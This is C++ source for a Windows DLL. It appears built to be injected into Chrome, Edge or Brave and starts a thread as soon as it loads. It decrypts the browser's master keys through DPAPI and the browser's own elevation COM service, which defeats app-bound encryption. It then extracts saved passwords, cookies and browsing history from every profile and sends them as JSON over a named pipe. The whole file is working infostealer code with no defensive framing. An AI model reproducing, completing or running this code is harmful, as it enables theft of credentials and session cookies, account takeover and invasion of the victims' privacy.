#include <windows.h>
#include <string>
#include <vector>
#include <iostream>
#include <filesystem>
#include <shlobj.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <fstream>
#include <sstream>

namespace fs = std::filesystem;

enum class Browser { Chrome, Edge, Brave };

Browser get_browser_type() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    std::wstring s = path;
    for (auto& c : s) c = towlower(c);
    if (s.find(L"msedge.exe") != std::wstring::npos) return Browser::Edge;
    if (s.find(L"brave.exe") != std::wstring::npos) return Browser::Brave;
    return Browser::Chrome;
}

std::wstring get_user_data_path(Browser browser) {
    wchar_t path[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path);
    fs::path base(path);
    switch (browser) {
        case Browser::Chrome: return base / L"Google\\Chrome\\User Data";
        case Browser::Edge: return base / L"Microsoft\\Edge\\User Data";
        case Browser::Brave: return base / L"BraveSoftware\\Brave-Browser\\User Data";
    }
    return L"";
}

std::vector<std::wstring> get_profiles(const std::wstring& data_path) {
    std::vector<std::wstring> profiles = { L"Default" };
    if (!fs::exists(data_path)) return profiles;
    for (const auto& entry : fs::directory_iterator(data_path)) {
        if (entry.is_directory()) {
            std::wstring name = entry.path().filename().wstring();
            if (name.find(L"Profile ") == 0) {
                profiles.push_back(name);
            }
        }
    }
    return profiles;
}

std::vector<unsigned char> base64_decode_payload(const std::string& in) {
    static const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) T[chars[i]] = i;
    int val = 0, valb = -8;
    std::vector<unsigned char> out;
    for (unsigned char c : in) {
        if (T[c] == -1) continue;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            out.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return out;
}

std::vector<unsigned char> decrypt_dpapi(const std::vector<unsigned char>& data) {
    DATA_BLOB input = { (DWORD)data.size(), (BYTE*)data.data() };
    DATA_BLOB output = { 0, nullptr };
    if (CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr, 0, &output)) {
        std::vector<unsigned char> result(output.pbData, output.pbData + output.cbData);
        LocalFree(output.pbData);
        return result;
    }
    return {};
}

struct IElevatorVTbl {
    HRESULT(STDMETHODCALLTYPE* QueryInterface)(void*, const GUID*, void**);
    ULONG(STDMETHODCALLTYPE* AddRef)(void*);
    ULONG(STDMETHODCALLTYPE* Release)(void*);
    HRESULT(STDMETHODCALLTYPE* RunRecoveryCRXElevated)(void*, const wchar_t*, const wchar_t*, const wchar_t*, DWORD, DWORD*);
    HRESULT(STDMETHODCALLTYPE* EncryptData)(void*, DWORD, BSTR, BSTR*, DWORD*);
    HRESULT(STDMETHODCALLTYPE* DecryptData)(void*, BSTR, BSTR*, DWORD*);
};

std::vector<unsigned char> decrypt_with_elevator(const std::vector<unsigned char>& encrypted_blob, Browser browser) {
    GUID clsid = { 0x708860E0, 0xF641, 0x4611, { 0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B } }; // Chrome
    if (browser == Browser::Edge) clsid = { 0x1FCBE96C, 0x1697, 0x43AF, { 0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67 } };
    else if (browser == Browser::Brave) clsid = { 0x576B31AF, 0x6369, 0x4B6B, { 0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B } };
    GUID iid = { 0x1BF5208B, 0x295F, 0x4992, { 0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38 } }; // IElevator2
    CoInitialize(NULL);
    void* elevator = nullptr;
    HRESULT hr = CoCreateInstance(clsid, NULL, CLSCTX_LOCAL_SERVER, iid, &elevator);
    if (FAILED(hr)) { CoUninitialize(); return {}; }
    BSTR bstr_enc = SysAllocStringByteLen((const char*)encrypted_blob.data(), (UINT)encrypted_blob.size());
    BSTR bstr_dec = nullptr; DWORD last_err = 0;
    IElevatorVTbl* vtable = *(IElevatorVTbl**)elevator;
    hr = vtable->DecryptData(elevator, bstr_enc, &bstr_dec, &last_err);
    std::vector<unsigned char> result;
    if (SUCCEEDED(hr) && bstr_dec) { result.assign((unsigned char*)bstr_dec, (unsigned char*)bstr_dec + SysStringByteLen(bstr_dec)); }
    SysFreeString(bstr_enc); if (bstr_dec) SysFreeString(bstr_dec);
    vtable->Release(elevator); CoUninitialize(); return result;
}

#include "sqlite3.h"
#include <nlohmann/json.hpp>
using json = nlohmann::json;

struct PasswordData { std::string url, user, pass; };
struct CookieData { std::string host, name, value; };
struct HistoryData { std::string url, title; int visits; };

std::vector<unsigned char> aes_gcm_decrypt(const std::vector<unsigned char>& key, const std::vector<unsigned char>& data) {
    if (data.size() < 15) return {};
    BCRYPT_ALG_HANDLE hAlg = NULL; BCRYPT_KEY_HANDLE hKey = NULL;
    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (BYTE*)key.data(), (DWORD)key.size(), 0);
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    memset(&authInfo, 0, sizeof(authInfo));
    authInfo.cbSize = sizeof(authInfo);
    authInfo.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;
    authInfo.pbNonce = (BYTE*)data.data() + 3; authInfo.cbNonce = 12;
    authInfo.pbTag = (BYTE*)data.data() + data.size() - 16; authInfo.cbTag = 16;
    DWORD cbPlaintext = 0; std::vector<unsigned char> ciphertext(data.begin() + 15, data.end() - 16);
    std::vector<unsigned char> plaintext(ciphertext.size());
    NTSTATUS status = BCryptDecrypt(hKey, ciphertext.data(), (DWORD)ciphertext.size(), &authInfo, NULL, 0, plaintext.data(), (DWORD)plaintext.size(), &cbPlaintext, 0);
    BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlg, 0);
    if (status == 0) return plaintext; return {};
}

void extract_passwords(const fs::path& db_path, const std::vector<unsigned char>& v10, const std::vector<unsigned char>& v20, std::vector<PasswordData>& out) {
    if (!fs::exists(db_path)) return;
    fs::path temp_path = fs::temp_directory_path() / "pass_db";
    try { fs::copy_file(db_path, temp_path, fs::copy_options::overwrite_existing); } catch (...) { return; }
    sqlite3* db; if (sqlite3_open(temp_path.string().c_str(), &db) != SQLITE_OK) return;
    const char* sql = "SELECT origin_url, username_value, password_value FROM logins";
    sqlite3_stmt* stmt;
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            std::string url = (const char*)sqlite3_column_text(stmt, 0);
            std::string user = (const char*)sqlite3_column_text(stmt, 1);
            const void* blob = sqlite3_column_blob(stmt, 2); int size = sqlite3_column_bytes(stmt, 2);
            std::vector<unsigned char> data((unsigned char*)blob, (unsigned char*)blob + size);
            if (data.size() > 3) {
                bool is_v20 = (memcmp(data.data(), "v20", 3) == 0);
                const std::vector<unsigned char>& key = is_v20 ? v20 : v10;
                if (!key.empty()) {
                    std::vector<unsigned char> decrypted = aes_gcm_decrypt(key, data);
                    out.push_back({ url, user, std::string(decrypted.begin(), decrypted.end()) });
                }
            }
        }
        sqlite3_finalize(stmt);
    }
    sqlite3_close(db);
}

void extract_cookies(const fs::path& db_path, const std::vector<unsigned char>& v10, const std::vector<unsigned char>& v20, std::vector<CookieData>& out) {
    if (!fs::exists(db_path)) return;
    fs::path temp_path = fs::temp_directory_path() / "cook_db";
    try { fs::copy_file(db_path, temp_path, fs::copy_options::overwrite_existing); } catch (...) { return; }
    sqlite3* db; if (sqlite3_open(temp_path.string().c_str(), &db) != SQLITE_OK) return;
    const char* sql = "SELECT host_key, name, encrypted_value FROM cookies";
    sqlite3_stmt* stmt;
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            std::string host = (const char*)sqlite3_column_text(stmt, 0);
            std::string name = (const char*)sqlite3_column_text(stmt, 1);
            const void* blob = sqlite3_column_blob(stmt, 2); int size = sqlite3_column_bytes(stmt, 2);
            std::vector<unsigned char> data((unsigned char*)blob, (unsigned char*)blob + size);
            if (data.size() > 3) {
                bool is_v20 = (memcmp(data.data(), "v20", 3) == 0);
                const std::vector<unsigned char>& key = is_v20 ? v20 : v10;
                if (!key.empty()) {
                    std::vector<unsigned char> decrypted = aes_gcm_decrypt(key, data);
                    const unsigned char* val_start = decrypted.data(); size_t val_len = decrypted.size();
                    if (is_v20 && val_len > 32) { val_start += 32; val_len -= 32; }
                    out.push_back({ host, name, std::string((const char*)val_start, val_len) });
                }
            }
        }
        sqlite3_finalize(stmt);
    }
    sqlite3_close(db);
}

void extract_history(const fs::path& db_path, std::vector<HistoryData>& out) {
    if (!fs::exists(db_path)) return;
    fs::path temp_path = fs::temp_directory_path() / "hist_db";
    try { fs::copy_file(db_path, temp_path, fs::copy_options::overwrite_existing); } catch (...) { return; }
    sqlite3* db; if (sqlite3_open(temp_path.string().c_str(), &db) != SQLITE_OK) return;
    const char* sql = "SELECT url, title, visit_count FROM urls LIMIT 500";
    sqlite3_stmt* stmt;
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            std::string url = (const char*)sqlite3_column_text(stmt, 0);
            const char* title_ptr = (const char*)sqlite3_column_text(stmt, 1);
            std::string title = title_ptr ? title_ptr : "";
            int visits = sqlite3_column_int(stmt, 2);
            out.push_back({ url, title, visits });
        }
        sqlite3_finalize(stmt);
    }
    sqlite3_close(db);
}

void do_work() {
    Browser browser = get_browser_type();
    std::wstring data_path_w = get_user_data_path(browser);
    fs::path data_path(data_path_w);
    std::ifstream ls_file(data_path / "Local State");
    if (!ls_file.is_open()) return;
    json ls_json; ls_file >> ls_json;
    std::vector<unsigned char> v10_key, v20_key;
    if (ls_json.contains("os_crypt") && ls_json["os_crypt"].contains("encrypted_key")) {
        std::string b64 = ls_json["os_crypt"]["encrypted_key"];
        std::vector<unsigned char> decoded = base64_decode_payload(b64);
        if (decoded.size() > 5 && memcmp(decoded.data(), "DPAPI", 5) == 0) {
            v10_key = decrypt_dpapi({decoded.begin() + 5, decoded.end()});
        }
    }
    std::string v20_b64;
    if (ls_json.contains("os_crypt") && ls_json["os_crypt"].contains("app_bound_encrypted_key")) v20_b64 = ls_json["os_crypt"]["app_bound_encrypted_key"];
    else if (ls_json.contains("app_bound_encrypted_key")) v20_b64 = ls_json["app_bound_encrypted_key"];
    if (!v20_b64.empty()) {
        std::vector<unsigned char> decoded = base64_decode_payload(v20_b64);
        std::vector<unsigned char> blob = (decoded.size() > 4 && memcmp(decoded.data(), "APPB", 4) == 0) ? std::vector<unsigned char>(decoded.begin() + 4, decoded.end()) : decoded;
        v20_key = decrypt_with_elevator(blob, browser);
    }
    std::vector<std::wstring> profiles = get_profiles(data_path_w);
    json collected = json::array();
    for (const auto& profile : profiles) {
        fs::path p_path = data_path / profile;
        json p_json = { {"name", std::string(profile.begin(), profile.end())} };
        std::vector<PasswordData> passwords; extract_passwords(p_path / "Login Data", v10_key, v20_key, passwords);
        p_json["passwords"] = json::array(); for (auto& p : passwords) p_json["passwords"].push_back({ {"url", p.url}, {"username", p.user}, {"password", p.pass} });
        std::vector<CookieData> cookies; extract_cookies(p_path / "Network/Cookies", v10_key, v20_key, cookies);
        p_json["cookies"] = json::array(); for (auto& c : cookies) p_json["cookies"].push_back({ {"host", c.host}, {"name", c.name}, {"value", c.value} });
        std::vector<HistoryData> history; extract_history(p_path / "History", history);
        p_json["history"] = json::array(); for (auto& h : history) p_json["history"].push_back({ {"url", h.url}, {"title", h.title}, {"visit_count", h.visits} });
        collected.push_back(p_json);
    }
    const wchar_t* pipe_name = L"\\\\.\\pipe\\chrome_extractor";
    HANDLE h_pipe = INVALID_HANDLE_VALUE;
    for (int i = 0; i < 30; i++) {
        h_pipe = CreateFileW(pipe_name, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (h_pipe != INVALID_HANDLE_VALUE) break;
        Sleep(200);
    }
    if (h_pipe != INVALID_HANDLE_VALUE) {
        std::string s = collected.dump(); DWORD written;
        WriteFile(h_pipe, s.data(), (DWORD)s.size(), &written, NULL);
        CloseHandle(h_pipe);
    }
}

DWORD WINAPI thread_proc(LPVOID lpParam) {
    do_work();
    return 0;
}

extern "C" BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        HANDLE hThread = CreateThread(NULL, 0, thread_proc, NULL, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
    return TRUE;
}
